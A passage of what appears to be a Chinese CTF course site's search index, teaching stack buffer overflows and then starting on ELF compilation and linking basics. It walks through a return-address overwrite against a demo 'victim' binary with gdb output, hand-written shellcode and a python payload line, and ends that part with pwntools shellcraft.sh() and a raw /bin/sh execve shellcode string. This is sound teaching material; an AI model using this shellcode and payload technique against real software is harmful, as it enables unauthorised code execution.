\u4f4d\u6c47\u7f16\u4e2d\u7684\u51fd\u6570\u6808\u5e27\u5e03\u5c40\uff0c\u53ef\u4ee5\u753b\u51fa\u672c\u7a0b\u5e8f\u4e2d main \u51fd\u6570\u7684\u6808\u5e27\u5e03\u5c40\u5982\u4e0b\uff08\u8bf7\u6ce8\u610f\u4e0b\u56fe\u662f\u6309 \u6808\u9876\u5728\u4e0a\u3001\u6808\u5e95\u5728\u4e0b \u7684\u65b9\u5f0f\u753b\u7684\uff09\uff1a</p> <pre><code>                     Stack\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n name(-0x40)--&gt; +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n  rbp(+0x00)--&gt; +-------------+\n                |   old rbp   |\n     (+0x08)--&gt; +-------------+ &lt;--rsp points here\n                |   ret rip   |\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n                +-------------+\n</code></pre> <p>rbp \u5373\u51fd\u6570\u7684\u6808\u5e27\u57fa\u6307\u9488\uff0c\u5728main\u51fd\u6570\u4e2d\uff0c name \u6570\u7ec4\u4fdd\u5b58\u5728\u00a0rbp-0x40~rbp+0x00\u00a0\u4e4b\u95f4\uff0c\u00a0rbp+0x00\u00a0\u5904\u4fdd\u5b58\u7684\u662f\u00a0\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp \u6570\u503c\u00a0\uff0c\u00a0rbp+0x08\u00a0\u5904\u4fdd\u5b58\u4e86\u00a0main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u00a0\u3002\u5f53main\u51fd\u6570\u6267\u884c\u5b8c leave \u547d\u4ee4\uff0c\u6267\u884c\u5230 ret \u547d\u4ee4\u65f6\uff1a\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp \u6570\u503c\u5df2\u91cd\u65b0\u53d6\u56de\u81f3 rbp \u5bc4\u5b58\u5668\uff0c\u6808\u9876\u6307\u9488 rsp \u5df2\u7ecf\u6307\u5411\u4e86\u4fdd\u5b58\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u7684\u5355\u5143\u3002\u4e4b\u540e\u7684 ret \u547d\u4ee4\u4f1a\u5c06\u6b64\u5730\u5740\u51fa\u6808\uff0c\u7136\u540e\u8df3\u5230\u6b64\u5730\u5740\u3002</p> <p>\u73b0\u5728\u53ef\u4ee5\u56de\u7b54\u521a\u624d\u90a3\u4e2a\u95ee\u9898\u4e86\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u4e86\u5f88\u591a\u5f88\u591a\u5b57\u7b26\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u4e8b\u60c5\u3002\u6b64\u65f6 scanf \u51fd\u6570\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u7a7a\u683c\u5b57\u7b26\u4e4b\u524d\u7684\u6240\u6709\u5b57\u7b26\uff0c\u7136\u540e\u5168\u90e8\u62f7\u8d1d\u5230 name \u6307\u5411\u7684\u5730\u5740\u5904\u3002\u82e5\u7528\u6237\u8f93\u5165\u4e86 100 \u4e2a \u201cA\u201d \u518d\u56de\u8f66\uff0c\u5219\u6808\u4f1a\u662f\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50\uff1a</p> <pre><code>                     Stack\n                +-------------+\n                |     ...     |\n                +-------------+\n                |     ...     |\n name(-0x40)--&gt; +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |   AAAAAAAA  |\n  rbp(+0x00)--&gt; +-------------+\n                |   AAAAAAAA  | (should be \"old rbp\")\n     (+0x08)--&gt; +-------------+ &lt;--rsp points here\n                |   AAAAAAAA  | (should be \"ret rip\")\n                +-------------+\n                |   AAAAAAAA  |\n                +-------------+\n                |     ...     |\n                +-------------+\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u00a0rbp\u00a0\u6570\u503c\u4ee5\u53ca\u00a0main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u00a0\u5168\u90e8\u90fd\u88ab\u6539\u5199\u4e86\uff0c\u5f53\u6267\u884c\u5b8c ret \u547d\u4ee4\u540e\uff0c cpu \u5c06\u8df3\u5230 0x4141414141414141 ('AAAAAAAA') \u5730\u5740\u5904\uff0c\u5f00\u59cb\u6267\u884c\u6b64\u5730\u5740\u7684\u6307\u4ee4\u3002</p> <p>\u8fd9\u5c31\u662f\u4f20\u8bf4\u4e2d\u7684\u8fd4\u56de\u5730\u5740\u8986\u76d6</p> <p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c 0x4141414141414141 \u662f\u4e00\u4e2a\u975e\u6cd5\u5730\u5740\uff0c\u56e0\u6b64\u7a0b\u5e8f\u4f1a\u51fa\u9519\u5e76\u9000\u51fa\u3002\u4f46\u662f\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u4e86\u7cbe\u5fc3\u6311\u9009\u7684\u5b57\u7b26\u540e\uff0c\u8986\u76d6\u5728\u8fd9\u91cc\u7684\u6570\u503c\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u5462\uff1f\u5982\u679c\u8fd9\u4e2a\u5730\u5740\u4e0a\u6070\u597d\u4fdd\u5b58\u4e86\u7528\u6237\u60f3\u8981\u6267\u884c\u7684\u6076\u610f\u7684\u6307\u4ee4\u5462\uff1f\u4f1a\u53d1\u751f\u4ec0\u4e48\u4e8b\u60c5\uff1f</p> <p>\u4ee5\u4e0a\u5c31\u662f\u00a0\u6808\u6ea2\u51fa\u00a0\u7684\u672c\u8d28\uff0c\u5982\u679c\u7a0b\u5e8f\u5728\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u65f6\u5019\u4e0d\u5bf9\u00a0\u4e0b\u6807\u8d8a\u754c\u00a0\u8fdb\u884c\u68c0\u67e5\uff0c\u76f4\u63a5\u5c06\u5176\u4fdd\u5b58\u5230\u6808\u4e0a\uff0c\u7528\u6237\u5c31\u6709\u53ef\u80fd\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u8f93\u5165\u00a0\u8db3\u591f\u591a\u7684\u3001\u7cbe\u5fc3\u6311\u9009\u7684\u5b57\u7b26\u00a0\uff0c\u6539\u5199\u51fd\u6570\u7684\u00a0\u8fd4\u56de\u5730\u5740\u00a0\uff08\u4e5f\u53ef\u4ee5\u662f jmp \u3001 call \u6307\u4ee4\u7684\u00a0\u8df3\u8f6c\u5730\u5740\u00a0\uff09\uff0c\u7531\u6b64\u83b7\u53d6\u00a0\u5bf9 cpu \u7684\u63a7\u5236\u00a0\uff0c\u4ece\u800c\u6267\u884c\u4efb\u4f55\u4ed6\u60f3\u6267\u884c\u7684\u52a8\u4f5c\u3002</p> <p>\u4e0b\u9762\u4ecb\u7ecd\u6700\u7ecf\u5178\u7684\u6808\u6ea2\u51fa\u653b\u51fb\u65b9\u6cd5\uff1a</p> <p>\u5c06\u60f3\u8981\u6267\u884c\u7684\u6307\u4ee4\u673a\u5668\u7801\u5199\u5230 name \u6570\u7ec4\u4e2d\uff0c\u7136\u540e\u6539\u5199\u51fd\u6570\u8fd4\u56de\u5730\u5740\u4e3a name \u7684\u8d77\u59cb\u5730\u5740\uff0c\u8fd9\u6837 ret \u547d\u4ee4\u6267\u884c\u540e\u5c06\u4f1a\u8df3\u8f6c\u5230 name \u8d77\u59cb\u5730\u5740\uff0c\u5f00\u59cb\u6267\u884c name \u6570\u7ec4\u4e2d\u7684\u673a\u5668\u7801\u3002</p> \u6ce8\u610f\uff0c\u53ef\u6267\u884c\u5730\u5740\u4e2d\u5e94\u8be5\u4e3a\u673a\u5668\u7801\u54e6 <pre><code># \u4f9d\u6b21\u6267\u884c\uff1a\n\u276f gcc -S -O2 sub.c\n\u276f as sub.s -o sub.o\n\u276f objdump -d sub.o\n&gt; cat sub.o\nsub.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\nDisassembly of section .text:\n0000000000000000 &lt;sub&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   89 f8                   mov    %edi,%eax\n   6:   29 f0                   sub    %esi,%eax\n   8:   c3                      ret\n</code></pre> <p>\u673a\u5668\u7801\u5c31\u662f <code>\\xf4\\x0f\\x1e\\xfa\\x89\\xf8\\x29\\xf0\\xc3</code></p> <p>\u6211\u4eec\u5c06\u7528\u8fd9\u79cd\u65b9\u6cd5\u6267\u884c\u4e00\u6bb5\u7b80\u5355\u7684\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u4ec5\u4ec5\u662f\u5728\u7ec8\u7aef\u6253\u5370 \u201cHack!\u201d \u7136\u540e\u6b63\u5e38\u9000\u51fa\u3002</p> <p>\u9996\u5148\u8981\u77e5\u9053 name \u7684\u8d77\u59cb\u5730\u5740\uff0c\u6253\u5f00 gdb \uff0c\u5bf9 victim \u8fdb\u884c\u8c03\u8bd5\uff0c\u8f93\u5165\u00a0gdb -q ./victim\u00a0\uff0c\u518d\u8f93\u5165\u00a0break *main\u00a0\u5728 main \u51fd\u6570\u7684\u5f00\u5934\u4e0b\u4e00\u4e2a\u65ad\u70b9\uff0c\u518d\u8f93\u5165\u00a0run\u00a0\u547d\u4ee4\u5f00\u59cb\u8fd0\u884c\uff0c\u5982\u4e0b\uff1a</p> <pre><code>$ gdb -q ./victim\nReading symbols from ./victim...done.\n(gdb) break *main\nBreakpoint 1 at 0x400576: file victim.c, line 3.\n(gdb) run\nStarting program: /home/hcj/blog/rop/ch02/victim \n\nBreakpoint 1, main () at victim.c:3\n3   int main() {\n=&gt; 0x0000000000400576 &lt;main+0&gt;: 55  push   rbp\n   0x0000000000400577 &lt;main+1&gt;: 48 89 e5    mov    rbp,rsp\n   0x000000000040057a &lt;main+4&gt;: 48 83 ec 40 sub    rsp,0x40\n(gdb) \n</code></pre> <p>\u6b64\u65f6\u7a0b\u5e8f\u505c\u7559\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\uff0c\u8f93\u5165\u00a0p &amp;name[0]\u00a0\u548c\u00a0x/gx $rsp\u00a0\u5206\u522b\u67e5\u770b name \u7684\u8d77\u59cb\u6307\u9488\u548c\u6b64\u65f6\u7684\u6808\u9876\u6307\u9488 rsp \u3002</p> <pre><code>(gdb) p &amp;name[0]\n$1 = 0x7fffffffe100 \"\\001\"\n(gdb) x/gx $rsp\n0x7fffffffe148: 0x00007ffff7a54b45\n(gdb) \n</code></pre> <p>\u5f97\u5230 name \u7684\u8d77\u59cb\u6307\u9488\u4e3a 0x7fffffffe100 \u3001\u6b64\u65f6\u7684\u6808\u9876\u6307\u9488 rsp \u4e3a 0x7fffffffe148 \uff0c name \u5230 rsp \u4e4b\u95f4\u4e00\u5171 0x48 \uff08\u4e5f\u5c31\u662f 72 \uff09\u4e2a\u5b57\u8282\uff0c\u8fd9\u548c\u4e4b\u524d\u7684\u5206\u6790\u662f\u4e00\u81f4\u7684\u3002</p> <p>\u4e0b\u9762\u6765\u5199\u653b\u51fb\u6307\u4ee4\u7684\u673a\u5668\u7801\uff0c\u9996\u5148\u5199\u51fa\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>[section .text]\n        global _start\n\n_start:\n        jmp END\nBEGIN:\n        mov rax, 1\n        mov rdi, 1\n        pop rsi\n        mov rdx, 5\n        syscall\n\n        mov rax, 0x3c\n        mov rdi, 0\n        syscall\nEND:\n        call BEGIN\n        DB \"Hack!\"\n</code></pre> <p>\u8fd9\u6bb5\u7a0b\u5e8f\u548c\u7b2c\u4e00\u8282\u7684 Hello-x64 \u57fa\u672c\u4e00\u6837\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5de7\u5999\u7684\u5229\u7528\u4e86\u00a0call BEGIN \u548c pop rsi\u00a0\u83b7\u5f97\u4e86\u5b57\u7b26\u4e32 \u201cHack\u201d \u7684\u5730\u5740\u3001\u5e76\u4fdd\u5b58\u5230 rsi \u4e2d\u3002\u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3a shell.asm \uff0c\u7f16\u8bd1\u8fd0\u884c\u4e00\u4e0b\uff1a</p> <pre><code>$ nasm -f elf64 shell.asm\n$ ld -s -o shell shell.o\n$ ./shell\nHack!\n</code></pre> <p>\u7136\u540e\u7528 objdump \u7a0b\u5e8f\u63d0\u53d6\u51fa\u673a\u5668\u7801\uff1a</p> <pre><code>$ objdump -d shell -M intel\n...\n0000000000400080 &lt;.text&gt;:\n  400080:   eb 1e                   jmp    0x4000a0\n  400082:   b8 01 00 00 00          mov    eax,0x1\n  400087:   bf 01 00 00 00          mov    edi,0x1\n  40008c:   5e                      pop    rsi\n  40008d:   ba 05 00 00 00          mov    edx,0x5\n  400092:   0f 05                   syscall \n  400094:   b8 3c 00 00 00          mov    eax,0x3c\n  400099:   bf 00 00 00 00          mov    edi,0x0\n  40009e:   0f 05                   syscall \n  4000a0:   e8 dd ff ff ff          call   0x400082\n  4000a5:   48 61                   rex.W (bad) \n  4000a7:   63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]\n</code></pre> <p>\u4ee5\u4e0a\u673a\u5668\u7801\u4e00\u5171 42 \u4e2a\u5b57\u8282\uff0c name \u5230 ret rip \u4e4b\u95f4\u4e00\u5171 72 \u4e2a\u5b57\u8282\uff0c\u56e0\u6b64\u8fd8\u9700\u8981\u8865 30 \u4e2a\u5b57\u8282\uff0c\u6700\u540e\u586b\u4e0a name \u7684\u8d77\u59cb\u5730\u5740 0x7fffffffe100 \u3002 main \u51fd\u6570\u6267\u884c\u5230 ret \u547d\u4ee4\u65f6\uff0c\u6808\u4e0a\u7684\u6570\u636e\u5e94\u8be5\u662f\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50\u7684\uff08\u6ce8\u610f\u6700\u540e\u7684 name \u8d77\u59cb\u5730\u5740\u9700\u8981\u6309\u00a0\u5c0f\u7aef\u987a\u5e8f\u00a0\u4fdd\u5b58\uff09\uff1a</p> <pre><code>                                        Stack\n name(0x7fffffffe100)--&gt; +---------------------------------+ &lt;---+\n                         |  eb 1e           (jmp END)      |     |\n                BEGIN--&gt; +---------------------------------+     |\n                         |  b8 01 00 00 00  (mov eax,0x1)  |     |\n                         +---------------------------------+     |\n                         |  bf 01 00 00 00  (mov edi,0x1)  |     |\n                         +---------------------------------+     |\n                         |  5e              (pop rsi)      |     |\n                         +---------------------------------+     |\n                         |  ba 05 00 00 00  (mov edx,0x5)  |     |\n                         +---------------------------------+     |\n                         |  0f 05           (syscall)      |     |\n                         +---------------------------------+     |\n                         |  b8 3c 00 00 00  (mov eax,0x3c) |     |\n                         +---------------------------------+     |\n                         |  bf 00 00 00 00  (mov edi,0x0)  |     |\n                         +---------------------------------+     |\n                         |  0f 05           (syscall)      |     |\n                   END-&gt; +---------------------------------+     |\n                         |  e8 dd ff ff ff  (call BEGIN)   |     |\n                         +---------------------------------+     |\n                         |  48 61 63 6b 21  (\"Hack!\")      |     |\n     (0x7fffffffe12a)--&gt; +---------------------------------+     |\n                         |  \"\\x00\"*30                      |     |\n  rsp(0x7fffffffe148)--&gt; +---------------------------------+     |\n                         |  00 e1 ff ff ff 7f 00 00        | ----+\n                         +---------------------------------+\n</code></pre> <p>\u5c0f\u7aef\u987a\u5e8f</p> <p>\u5728python\u4e2d\uff0c \u5c0f\u7aef\u987a\u5e8f\u53ef\u4ee5\u76f4\u63a5\u7528 <code>p64</code> \u51fd\u6570\u8f6c\u6362(\u572832\u4f4d\u7cfb\u7edf\u4e2d\u7528<code>p32</code>)</p> <p>\u4e0a\u56fe\u4e2d\u7684\u6808\u4e0a\u7684\u6240\u6709\u5b57\u8282\u7801\u5c31\u662f\u6211\u4eec\u9700\u8981\u8f93\u5165\u7ed9 scanf \u51fd\u6570\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e00\u822c\u79f0\u4e3a shellcode \u3002\u7531\u4e8e\u8fd9\u6bb5 shellcode \u4e2d\u6709\u5f88\u591a\u65e0\u6cd5\u901a\u8fc7\u952e\u76d8\u8f93\u5165\u7684\u5b57\u8282\u7801\uff0c\u56e0\u6b64\u7528 python \u5c06\u5176\u6253\u5370\u81f3\u6587\u4ef6\u4e2d\uff1a</p> <pre><code>$ python -c 'print \"\\xeb\\x1e\\xb8\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x5e\\xba\\x05\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\\x00\\x00\\xbf\\x00\\x00\\x00\\x00\\x0f\\x05\\xe8\\xdd\\xff\\xff\\xff\\x48\\x61\\x63\\x6b\\x21\" + \"\\x00\"*30 + \"\\x00\\xe1\\xff\\xff\\xff\\x7f\\x00\\x00\"' &gt; shellcode\n</code></pre> <p>\u73b0\u5728\u53ef\u4ee5\u5bf9 victim \u8fdb\u884c\u653b\u51fb\u4e86\uff0c\u4e0d\u8fc7\u76ee\u524d\u53ea\u80fd\u5728 gdb \u7684\u8c03\u8bd5\u73af\u5883\u4e0b\u8fdb\u884c\u653b\u51fb\u3002\u8f93\u5165\u00a0gdb -q ./victim\u00a0\uff0c\u518d\u8f93\u5165\u00a0run &lt; shellcode\uff1a</p> <pre><code>$ gdb -q ./victim\nReading symbols from ./victim...done.\n(gdb) run &lt; shellcode\nStarting program: /home/hcj/blog/rop/ch02/victim &lt; shellcode\nWhat's your name?Hello, \ufffd\n\ufffd!\nHack![Inferior 1 (process 2711) exited normally]\n(gdb) \n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 shellcode \u5df2\u7ecf\u987a\u5229\u7684\u88ab\u6267\u884c\uff0c\u6808\u6ea2\u51fa\u653b\u51fb\u6210\u529f\u3002</p> <p>\u7f16\u5199 shellcode \u9700\u8981\u6ce8\u610f\u4e24\u4e2a\u4e8b\u60c5\uff1a</p> <ul> <li>\uff081\uff09\u4e3a\u4e86\u4f7f shellcode \u88ab scanf \u51fd\u6570\u5168\u90e8\u8bfb\u53d6\uff0c shellcode \u4e2d\u4e0d\u80fd\u542b\u6709\u7a7a\u683c\u5b57\u7b26\uff08\u5305\u62ec\u7a7a\u683c\u3001\u56de\u8f66\u3001Tab\u952e\u7b49\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u80fd\u542b\u6709\u00a0\\x10\u3001\\x0a\u3001\\x0b\u3001\\x0c\u3001\\x20\u00a0\u7b49\u8fd9\u4e9b\u5b57\u8282\u7801\uff0c\u5426\u5219 shellcode \u5c06\u4f1a\u88ab\u00a0\u622a\u65ad\u00a0\u3002\u5982\u679c\u88ab\u653b\u51fb\u7684\u7a0b\u5e8f\u4f7f\u7528 gets\u3001strcpy \u8fd9\u4e9b\u5b57\u7b26\u4e32\u62f7\u8d1d\u51fd\u6570\uff0c\u90a3\u4e48 shellcode \u4e2d\u4e0d\u80fd\u542b\u6709\u00a0\\x00\u00a0\u3002</li> <li>\uff082\uff09\u7531\u4e8e shellcode \u88ab\u52a0\u8f7d\u5230\u6808\u4e0a\u7684\u4f4d\u7f6e\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u56e0\u6b64\u8981\u6c42 shellcode \u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u4f4d\u7f6e\u90fd\u80fd\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u8bf4 shellcode \u4e2d\u8981\u4f7f\u7528\u00a0\u76f8\u5bf9\u5bfb\u5740\u00a0\u3002</li> </ul> <p>\u7f51\u4e0a\u6709\u975e\u5e38\u591a\u7684 shellcode \u53ef\u4ee5\u53c2\u8003\u4f7f\u7528\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 pwntools \u81ea\u5e26\u7684\uff1a</p> <pre><code>from pwn import *\n\nsc_asm = shellcraft.sh() # \u6c47\u7f16\u683c\u5f0f\nsc = asm(sc_asm) # \u6bd4\u7279\u6d41\u683c\u5f0f\n\np.sendafter(b\"what's your name: \\n\", sc.ljust(64, b\"\\x90\"))\n# \u5411\u53f3\u8865\u9f5064\u4f4d\uff0c\u6309\u5b9e\u9645\u9700\u6c42\u4fee\u6539\n</code></pre> <p>\u6700\u7b80\u5355\u7684 SHELLCODE \u5982\u4e0b</p> <pre><code>sc = (\n    b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n    b\"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\"\n).ljust(length,b'\\x90')\n</code></pre>"},{"location":"Courses/ctf/Reverse/","title":"Reverse \u57fa\u7840","text":""},{"location":"Courses/ctf/Reverse/#reverse","title":"Reverse \u57fa\u7840","text":"<p> \u7ea6 1024 \u4e2a\u5b57  32 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/ctf/Reverse/#_1","title":"\u53ef\u6267\u884c\u6587\u4ef6","text":"<p>\u4e3a\u4ec0\u4e48\u8ba1\u7b97\u673a\u53ef\u4ee5\u6267\u884c\u7ed9\u5b9a\u7684\u7a0b\u5e8f\u5462</p> <p>\u56e0\u4e3a\u4efb\u4f55\u7a0b\u5e8f\u90fd\u5c06\u6700\u7ec8\u8f6c\u5316\u6210 \u6307\u4ee4 \u7684\u5f62\u5f0f\u7531\u8ba1\u7b97\u673a\u6267\u884c</p> <p></p> <p>Tip</p> <p>\u4e0a\u56fe\u4ece\u9ad8\u7ea7\u8bed\u8a00\u8f6c\u5316\u5230\u6c47\u7f16\u8bed\u8a00\u7684\u8fc7\u7a0b\u79f0\u4e3a\u7f16\u8bd1(Compile)\uff0c\u4ece\u6c47\u7f16\u8bed\u8a00\u8f6c\u5316\u5230\u6307\u4ee4\u7684\u8fc7\u7a0b\u79f0\u4e3a\u6c47\u7f16(Assemble)</p> <p></p> <ul> <li>\u7f16\u8bd1\u6267\u884c\uff1a\u901a\u8fc7\u7f16\u8bd1\u5668 (compiler) \u5c06\u4ee3\u7801\u8f6c\u5316\u4e3a\u673a\u5668\u6307\u4ee4\u683c\u5f0f\u7684\u7a0b\u5e8f\uff0c\u8fdb\u800c\u6267\u884c<ul> <li>C++</li> <li>Golang</li> <li>\u6c47\u7f16</li> </ul> </li> <li>\u89e3\u91ca\u6267\u884c\uff1a\u901a\u8fc7\u89e3\u91ca\u5668 (interpreter) \u5c06\u4ee3\u7801\u8f6c\u5316\u4e3a VM \u683c\u5f0f\u7684\u7a0b\u5e8f\uff08\u5982\u5b57\u8282\u7801\uff09\uff0c\u8fdb\u800c\u5728 VM\u4e0a\u6267\u884c<ul> <li>Python</li> <li>Java (\u867d\u7136\u9700\u8981\u901a\u8fc7javac\u7f16\u8bd1\uff0c\u4f46\u672c\u8d28\u8fd8\u662f\u89e3\u91ca\u578b\u8bed\u8a00)</li> <li>PHP</li> <li>Shell</li> <li>Matlab</li> </ul> </li> </ul> <p></p> <p>\u5728CTF\u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u8981\u9762\u5bf9\u7684\u4e00\u822c\u90fd\u662fELF\u683c\u5f0f\u7684\u53ef\u6267\u884c\u6587\u4ef6</p> <ul> <li>\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c\u653b\u51fb\u9759\u6001\u68c0\u89c6 ELF \u6587\u4ef6<ul> <li>file</li> <li>objdump  (objdump -d  \u53cd\u6c47\u7f16) </li> <li>readelf</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Reverse/#elf-c","title":"ELF \u7684\u7f16\u8bd1\u3001\u94fe\u63a5(\u4ee5C\u4e3a\u4f8b)","text":"<ul> <li>\u7f16\u8bd1(\u6c47\u7f16)\uff1a\u4ece\u6e90\u4ee3\u7801\u5230\u76ee\u6807\u6587\u4ef6</li> <li>\u94fe\u63a5\uff1a\u4ece\u76ee\u6807\u6587\u4ef6\u5230\u53ef\u6267\u884c\u6587\u4ef6</li> </ul>"},{"location":"Courses/ctf/Reverse/#_2","title":"\u7f16\u8bd1","text":"<p>\u6e90\u6587\u4ef6 <code>hello.c</code> :</p> <pre><code>#include &lt;stdlib.h&gt;\nint main(int argc , char* argv[])\n{\n    printf(\"Hello World!\\n\");\n    return 0;\n}\n</code></pre> <p>\u901a\u8fc7 cat \u547d\u4ee4\u53ef\u4ee5\u5c06\u6587\u4ef6\u5185\u5bb9\u8f93\u51fa\u5230\u547d\u4ee4\u884c</p> <p>\u7f16\u8bd1\u6307\u4ee4\uff1a <code>gcc/clang hello.c</code></p> <p>\u4f46\u662f\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7f16\u8bd1\u7684\u4e2d\u95f4\u6587\u4ef6</p> <ul> <li>\u9884\u5904\u7406\uff1a <code>gcc/clang -E hello.c -o hello.c.i</code><ul> <li>\u5f97\u5230\u7684 <code>hello.c.i</code> \u5305\u542b\u5934\u6587\u4ef6\u66ff\u6362\u3001\u5b8f\u5c55\u5f00\u548c\u66ff\u6362</li> </ul> </li> </ul> <ul> <li>\u7f16\u8bd1\uff1a <code>gcc/clang -S hello.c -o hello.s</code><ul> <li><code>-S</code>: \u53ea\u8fdb\u884c Compile \u800c\u4e0d Assemble \u6216 link (\u5373\u8fdb\u884c\u5230\u6c47\u7f16\u8bed\u8a00)</li> <li><code>-Ox</code>: \u4f18\u5316\u7b49\u7ea7\uff0c\u7b49\u7ea7\u8d8a\u9ad8\u5f97\u5230\u7684\u6c47\u7f16\u8bed\u8a00\u8d8a\u95f4\u63a5</li> <li><code>-g</code>\uff1a\u542f\u7528\u8c03\u8bd5</li> </ul> </li> </ul> <ul> <li>\u751f\u6210\u7f16\u8bd1\u524d\u7aef(AST or IR)\uff1a<ul> <li>\u751f\u6210Clang AST\uff1a <code>clang -Xclang -ast-dump -S hello.c</code></li> <li>\u751f\u6210LLVM IR\uff1a <code>clang -Xclang -emit-llvm -S hello.c -o hello.ll</code></li> <li>\u751f\u6210gcc IR(\u4ee5\u53ca\u5176\u5b83\u7ec6\u8282)\uff1a <code>gcc -fdump-tree-all-graph -S hello.c</code></li> </ul> </li> <li>\u751f\u6210\u7f16\u8bd1\u540e\u7aef\uff1a<ul> <li>\u4eceLLVM IR\u5230\u6c47\u7f16\u4ee3\u7801\uff1a <code>llc hello.ll -o hello.s</code></li> <li>\u4ece\u6c47\u7f16\u4ee3\u7801\u5230\u76ee\u6807\u6587\u4ef6\uff1a <code>llvm-mc -filetype=obj hello.s -o hello.o</code></li> <li>\u4e00\u6b65\u5230\u4f4d\uff1a <code>llc -filetype=obj hello.ll -o hello.o</code></li> <li>\u4ece\u6c47\u7f16\u4ee3\u7801\u5230\u76ee\u6807\u6587\u4ef6\u7684gcc\u7248\u672c\uff1a <code>as hello.s -o hello.o</code></li> </ul> </li> </ul>"},{"location":"Courses/ctf/Reverse/#elf","title":"ELF\u7684\u94fe\u63a5","text":"<ul> <li>\u9759\u6001\u94fe\u63a5<ul> <li>\u628a\u6240\u6709\u9700\u8981\u7684\u5e93\u5168\u90e8\u590d\u5236\u4e00\u4efd\u5230\u8c03\u7528\u5b83\u7684ELF\u6587\u4ef6\u4e2d</li> <li>\u7f3a\u70b9\u5728\u4e8e\uff0c\u5982\u679c\u4f60\u5199\u4e86100\u4efdhello.c\uff0c\u90a3\u4e48\u5c31\u590d\u5236\u4e86100\u4efdprintf\u7684\u5b9e\u73b0\u51fd\u6570\uff0c\u7a7a\u95f4\u9700\u6c42\u5927</li> <li>\u4f18\u70b9\u4e3a\uff0c\u4e0d\u7ba1\u4f60\u7535\u8111\u4e0a\u6709\u6ca1\u6709stdio.h\u7684\u73af\u5883\uff0c\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6267\u884c\uff1b\u4ee5\u53ca\u8dd1\u7684\u901f\u5ea6\u66f4\u5feb</li> </ul> </li> <li>\u52a8\u6001\u94fe\u63a5<ul> <li>\u8ddf\u9759\u6001\u94fe\u63a5\u76f8\u53cd\uff0c\u4ec5\u4ec5\u5c06\u7a0b\u5e8f\u94fe\u63a5\u5230\u6240\u7528\u7684\u5e93\u4e0a</li> </ul> </li> </ul> <p>\u901a\u8fc7file\u547d\u4ee4\u67e5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u662fstatically link\u8fd8\u662fdynamically link</p> <p>\u4e00\u822c\u7f16\u8bd1\u5668\u90fd\u9ed8\u8ba4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c<code>gcc hello.c -static -o hello.o</code> \u4f7f\u7528static\u53c2\u6570\u5f3a\u5236\u8f6c\u5316\u4e3a\u9759\u6001\u94fe\u63a5</p> <p>\u4f7f\u7528ldd\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\u6240\u94fe\u63a5\u7684\u4e1c\u897f</p>"},{"location":"Courses/ctf/Reverse/#elf_1","title":"ELF \u7684\u88c5\u8f7d\u3001\u8fd0\u884c","text":"<ul> <li>\u53ef\u6267\u884c\u7a0b\u5e8f\u662f(Program)\u662f\u9759\u6001\u3001\u6587\u4ef6\u7684\u6982\u5ff5</li> <li>\u8fdb\u7a0b(Process)\u662f\u52a8\u6001\u3001\u7cfb\u7edf\u8fd0\u884c\u65f6\u7684\u6982\u5ff5<ul> <li>\u8fdb\u7a0b\u548c\u7ebf\u7a0b(Thread)</li> </ul> </li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\n__attribute__((constructor)) void func1() {\n\n\u00a0 